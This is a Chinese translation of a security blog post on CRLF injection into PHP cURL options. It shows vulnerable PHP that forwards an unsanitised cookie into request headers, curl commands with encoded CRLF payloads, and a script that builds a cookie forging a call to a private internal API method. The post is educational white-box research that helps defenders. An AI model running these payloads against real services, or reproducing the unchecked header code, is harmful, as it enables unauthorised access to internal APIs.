> 原文链接: https://www.anquanke.com//post/id/153933 


# 将CRLF注入到PHP的cURL选项中


                                阅读量   
                                **119738**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：medium.com
                                <br>原文地址：[https://medium.com/@tomnomnom/crlf-injection-into-phps-curl-options-e2e0d7cfe545](https://medium.com/@tomnomnom/crlf-injection-into-phps-curl-options-e2e0d7cfe545)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t011df3b3b6a76b920a.jpg)](https://p5.ssl.qhimg.com/t011df3b3b6a76b920a.jpg)

这是一篇关于将回车符和换行符注入调用内部 API的帖子。一年前我在GitHub上写了这篇文章的要点，但GitHub不是特别适合发布博客文章。你现在所看到的这 篇文章我添加了更多细节，所以它不是是直接复制粘贴的。

我喜欢做白盒测试。我不是一个优秀的黑盒测试人员，但我花了十多年的时间阅读和写PHP代码 – 并且在此过程中犯了很多错误 – 所以我知道要注意些什么。

我浏览了一些源代码发现了一个和这个有点像的函数：

```
&lt;?php
// common.php

function getTrialGroups()`{`
    $trialGroups = 'default';

    if (isset($_COOKIE['trialGroups']))`{`
        $trialGroups = $_COOKIE['trialGroups'];
    `}`

    return explode(",", $trialGroups);
`}`
```

我所看到的系统都有一个“Trial Groups”的概念。 每个用户会话都有一个与之关联的组，在cookie中以逗号分隔的列表存储。 我的想法是，当推出新功能时，可以首先为少数客户启用这些功能，以降低功能启动的风险，或者允许对特性的不同变体进行比较（这种方法称为A /B测试）。 getTrialGroups（）函数只是读取cookie值，将列表拆开并为用户返回一组 trial groups。

此功能中缺少白名单立即引起了我的注意。 我查找了其余部分的代码库来找调用函数的具体位置，这样我就可以看到对其返回值是否有任何不安全的使用。

我不能和你们分享具体的代码，但我把我的发现大致的写了下来：

```
&lt;?php
// server.php

// Include common functions
require __DIR__.'/common.php';

// Using the awesome httpbin.org here to just reflect
// our whole request back at us as JSON :)
$ch = curl_init("http://httpbin.org/post");

// Make curl_exec return the response body
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Set the content type and pass through any trial groups
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json",
    "X-Trial-Groups: " . implode(",", getTrialGroups())
]);

// Call the 'getPublicData' RPC method on the internal API
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    "method" =&gt; "getPublicData",
    "params" =&gt; []
]));

// Return the response to the user
echo curl_exec($ch);

curl_close($ch);
```

此代码使用cURL库在内部JSON API上调用getPublicData方法。 该API需要了解用户的trial groups，以便相应地更改其行为，所以trial groups 会在X-Trial-Groups标头中传递给API。

问题是，在设置CURLOPT_HTTPHEADER时不会检查回车符或换行符字符的值。 因为getTrialGroups()函数返回用户可控数据，因此可以将任意头部注入到API请求中。



## 演示

为了让大家更容易的理解，我将使用PHP的内置Web服务器在本地运行server.php:

```
tom@slim:~/tmp/crlf php -S localhost:1234 server.php
PHP 7.2.7-0ubuntu0.18.04.2 Development Server started at Sun Jul 29 14:15:14 2018
Listening on http://localhost:1234
Document root is /home/tom/tmp/crlf
Press Ctrl-C to quit.
```

使用cURL命令行实用程序，我们可以发送包含trialGroups cookie的示例请求：

```
tom@slim:~ curl -s localhost:1234 -b 'trialGroups=A1,B2' 
`{`
  "args": `{``}`, 
  "data": "`{`\"method\":\"getPublicData\",\"params\":[]`}`", 
  "files": `{``}`, 
  "form": `{``}`, 
  "headers": `{`
    "Accept": "*/*", 
    "Connection": "close", 
    "Content-Length": "38", 
    "Content-Type": "application/json", 
    "Host": "httpbin.org", 
    "X-Trial-Groups": "A1,B2"
  `}`, 
  "json": `{`
    "method": "getPublicData", 
    "params": []
  `}`, 
  "origin": "X.X.X.X", 
  "url": "http://httpbin.org/post"
`}`
```

我使用[http://httpbin.org/post](http://httpbin.org/post)代替内部API端点，它返回一个JSON文档，描述发送的POST请求，文档中包括请求中的所有POST数据和标头。

有关响应一个需要向大家提一下的事项是发送到httpbin.org的X-Trial-Groups标头包含trialGroups cookie中的A1，B2字符串。 然后现在试一下一些CRLF（回车换行）注入：

```
tom@slim:~ curl -s localhost:1234 -b 'trialGroups=A1,B2%0d%0aX-Injected:%20true' 
`{`
  "args": `{``}`, 
  "data": "`{`\"method\":\"getPublicData\",\"params\":[]`}`", 
  "files": `{``}`, 
  "form": `{``}`, 
  "headers": `{`
    "Accept": "*/*", 
    "Connection": "close", 
    "Content-Length": "38", 
    "Content-Type": "application/json", 
    "Host": "httpbin.org", 
    "X-Injected": "true", 
    "X-Trial-Groups": "A1,B2"
  `}`, 
  "json": `{`
    "method": "getPublicData", 
    "params": []
  `}`, 
  "origin": "X.X.X.X", 
  "url": "http://httpbin.org/post"
`}`
```

PHP会自动解码cookie值中的URL编码序列（例如％0d，％0a），因此我们可以在我们发送的cookie值中使用URL编码的回车符（％0d）和换行符（％0a）。 HTTP标头由CRLF序列分隔，因此当在PHP cURL库中写入请求标头时，X-Injected: true部分的payload将被视为单独的标头。太奇妙了！



## HTTP请求

那么通过在请求中注入标头，可以做些什么？说实话：其实也做不了什么。 如果我们深入研究一下HTTP请求的结构，你会发现我们可以做的不仅仅是注入头文件; 我们也可以注入POST数据！

要了解漏洞利用程序的原理，您需要了解一些有关HTTP请求的信息。 可以执行的最基本的HTTP POST请求如下：

```
POST /post HTTP/1.1
Host: httpbin.org
Connection: close
Content-Length: 7
thedata
```

让我们逐行分析。

```
POST /post HTTP/1.1
```

第一行说使用POST方法使用HTTP版本1.1向/post端点发送请求。

```
Host: httpbin.org
```

此标头告诉远程服务器我们正在httpbin.org上请求页面。 这似乎是多余的，但是当您连接到HTTP服务器时，您将连接到服务器的IP地址，而不是域名。 如果您的请求中未包含Host标头，那么服务器将无法知道您在浏览器的地址栏中输入的域名。

```
Connection: close
```

此标头要求服务器在完成发送响应后关闭底层TCP连接。 如果没有此标头，则在发送响应后，连接可能会一直保持打开状态。

```
Content-Length: 7
```

Content-Length标头告诉服务器在请求主体中将发送多少字节的数据。 这个很重要:)

这里没有错; 这个空白的行只包含一个CRLF序列。 它告诉服务器我们已完成发送标头，并且即将发送正文请求。

```
thedata
```

最后我们发送正文请求（AKA POST数据）。 它的长度（以字节为单位）必须与我们之前发送的Content-Length标头匹配，因为我们告诉服务器它必须读取那么多字节。

我们通过将echo命令传递给netcat来把此请求发送到httpbin.org：

```
tom@slim:~ echo -e "POST /post HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\nContent-Length: 7\r\n\r\nthedata" | nc httpbin.org 80
HTTP/1.1 200 OK
Connection: close
Server: gunicorn/19.9.0
Date: Sun, 29 Jul 2018 14:16:34 GMT
Content-Type: application/json
Content-Length: 257
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Via: 1.1 vegur
`{`
  "args": `{``}`, 
  "data": "thedata", 
  "files": `{``}`, 
  "form": `{``}`, 
  "headers": `{`
    "Connection": "close", 
    "Content-Length": "7", 
    "Host": "httpbin.org"
  `}`, 
  "json": null, 
  "origin": "X.X.X.X", 
  "url": "http://httpbin.org/post"
`}`
```

如我所料。 我们得到一些响应标头，一个CRLF序列，然后是响应的主体。

所以，技巧在于：如果你发送的POST数据比你在Content-Length标题中所说的要多，会发生什么？ 来试一试下：

```
tom@slim:~ echo -e "POST /post HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\nContent-Length: 7\r\n\r\nthedata some more data" | nc httpbin.org 80
HTTP/1.1 200 OK
Connection: close
Server: gunicorn/19.9.0
Date: Sun, 29 Jul 2018 14:20:10 GMT
Content-Type: application/json
Content-Length: 257
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Via: 1.1 vegur
`{`
  "args": `{``}`, 
  "data": "thedata", 
  "files": `{``}`, 
  "form": `{``}`, 
  "headers": `{`
    "Connection": "close", 
    "Content-Length": "7", 
    "Host": "httpbin.org"
  `}`, 
  "json": null, 
  "origin": "X.X.X.X", 
  "url": "http://httpbin.org/post"
`}`
```

我们保持Content-Length标头相同，告诉服务器我们要发送7个字节，并向请求体添加更多数据，但服务器只读取前7个字节。 这就是我们可以力用这个漏洞的诀窍。



## 漏洞利用

事实证明，当设置CURLOPT_HTTPHEADER选项时，不仅可以使用单个CRLF序列注入标头，还可以使用双CRLF序列注入POST数据。 这就是我们的计划： 制作我们自己的JSON POST数据，调用除getPublicData之外的一些方法; 叫做getPrivateData

> 以字节为单位获取该数据的长度
使用单个CRLF序列注入Content-Length标头，指定服务器仅读取该字节长度的数据
注入两个CRLF序列，然后我们的恶意JSON作为POST数据

如果一切顺利，内部API应完全忽略合法传入的JSONPOST数据，我们的恶意JSON得以利用。

为了让我轻松一些，我更愿意写一些小脚本来生成这些类型的payloads; 它减少了我犯错误的机会，并能够让我专注的弄明白错误的原因。 这是我写的一个小脚本：

```
tom@slim:~ cat gencookie.php 
&lt;?php
$postData = '`{`"method": "getPrivateData", "params": []`}`';
$length = strlen($postData);
$payload = "ignore\r\nContent-Length: `{`$length`}`\r\n\r\n`{`$postData`}`";
echo "trialGroups=".urlencode($payload);
tom@slim:~ php gencookie.php 
trialGroups=ignore%0D%0AContent-Length%3A+42%0D%0A%0D%0A%7B%22method%22%3A+%22getPrivateData%22%2C+%22params%22%3A+%5B%5D%7D
```

试一试：

```
tom@slim:~ curl -s localhost:1234 -b $(php gencookie.php) 
`{`
  "args": `{``}`, 
  "data": "`{`\"method\": \"getPrivateData\", \"params\": []`}`", 
  "files": `{``}`, 
  "form": `{``}`, 
  "headers": `{`
    "Accept": "*/*", 
    "Connection": "close", 
    "Content-Length": "42", 
    "Content-Type": "application/json", 
    "Host": "httpbin.org", 
    "X-Trial-Groups": "ignore"
  `}`, 
  "json": `{`
    "method": "getPrivateData", 
    "params": []
  `}`, 
  "origin": "X.X.X.X", 
  "url": "http://httpbin.org/post"
`}`
```

成功了！ 我们将x-Trial-Groups设置为忽略标头，注入Content-Length标头和我们自己的POST数据。 我们的POST数据可以合法发送，但服务器完全忽略了:)

这种类型的bug在做黑盒测试时不太可能被发现，但我认为它仍然值得让我写出来，因为现在有很多开源代码正在被使用，教育一下那些正在用可被攻击载体写代码的人总是有好处的，因为他们可能真的不知道这些载体可被攻击。



## 其他载体

自从发现这个bug以来，我一直试着留意类似的情况。 在我的研究中，我发现CURLOPT_HTTPHEADER并不是唯一容易遭受同样攻击的cURL选项。 以下选项（可能还有其他选项！）会在请求中隐式设置标头，并且容易受到攻击：

```
CURLOPT_HEADER
```

```
CURLOPT_COOKIE
```

```
CURLOPT_RANGE
```

```
CURLOPT_REFERER
```

```
CURLOPT_USERAGENT
```

```
CURLOPT_PROXYHEADER
```

如果你发现其他类似攻击，请告诉我:)
